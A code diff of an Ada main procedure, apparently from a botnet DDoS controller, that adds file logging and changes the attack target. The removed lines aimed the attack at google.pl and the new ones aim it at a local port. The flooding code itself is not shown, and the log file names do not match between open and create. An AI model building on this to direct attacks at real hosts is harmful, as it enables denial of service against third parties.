@@ -9,6 +9,7 @@ procedure main is
 	channel: Stream_Access;
 	targetURI : String := "";
 	isSuccessful : boolean;
+        Utfil : File_Type;
 
 	procedure initiate_connection (botAddress: in String; portNumber: in Port_Type) is
 	begin
@@ -49,13 +50,23 @@ procedure main is
 
 begin
 
+	begin
+		Open(Utfil, Append_File, "ddos_logs.txt");
+	Exception
+		when Name_Error => 	
+			Create(Utfil, Out_File, "ddos_log.txt");
+	end;
+	Put_Line(Utfil, "Started");
+	Put_Line(Utfil, "Looking for botnets...");
 	isSuccessful := check_bot_connection("127.0.0.1");
 	if(isSuccessful) then
-		put_line("Connected! Sending attack request!");
-		attack_order("127.0.0.1", "http://www.google.pl", 3);
-		put_line("Attack isSuccessful");
+		Put_Line(Utfil, "Connected to botnets! Sending attack request!");
+		attack_order("127.0.0.1", "127.0.0.1:8080", 3);
+		put_line(Utfil, "Attack is successful");
 	else
-		put_line("Not connected");
+		put_line(Utfil, "No botnets found");
 	end if;
+	Close(Utfil);
+
 
 end main;
